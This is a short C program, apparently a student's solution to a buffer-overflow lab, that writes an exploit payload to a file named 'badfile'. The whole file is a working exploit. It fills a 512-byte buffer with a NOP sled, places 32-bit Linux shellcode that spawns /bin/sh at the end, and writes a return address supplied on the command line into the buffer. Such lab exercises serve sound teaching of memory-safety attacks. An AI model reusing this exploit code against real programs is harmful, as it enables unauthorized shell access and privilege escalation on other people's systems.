/* exploit_1.c */
/* Creates a file containing the attack code */
#include <stdlib.h> 
#include <stdio.h> 
#include <string.h>

char shellcode[]= "\x31\xc0" /* xorl %eax,%eax */ "\x50" /* pushl %eax */ "\x68""//sh" /* pushl $0x68732f2f */ "\x68""/bin" /* pushl $0x6e69622f */ "\x89\xe3" /* movl %esp,%ebx */ "\x50" /* pushl %eax */ "\x53" /* pushl %ebx */ "\x89\xe1" /* movl %esp,%ecx */ "\x99" /* cdql */ "\xb0\x0b" /* movb $0x0b,%al */ "\xcd\x80" /* int $0x80 */ ;
int main(int argc, char **argv) 
{
	char buffer[512], *ptr;	
	FILE *badfile;
	int i,j,*hexptr;
	unsigned int hex;
	/* Initialize buffer with 0x90 (NOP instruction) */ 
	memset(&buffer, 0x90, 512);
	/* Fill the buffer with appropriate contents here */
	ptr = buffer;
	j = 0;
	for(i = 486; i < 512; i++){
		buffer[i] = shellcode[j];
		j++;
	}
	j = 0;
	if (argc > 0){
		/*
		for(i = 24; i<28; i++){
			buffer[i] = argv[1][j];
			j++;
		}*/
		hex =  strtoul(argv[1], NULL, 16);
		hexptr = (int *) buffer + 6;
		*hexptr = hex;
	}	
	/* Save the contents to the file "badfile" */ 
	badfile = fopen("./badfile", "w"); 
	fwrite(buffer, 512, 1, badfile); 
	fclose(badfile);
}
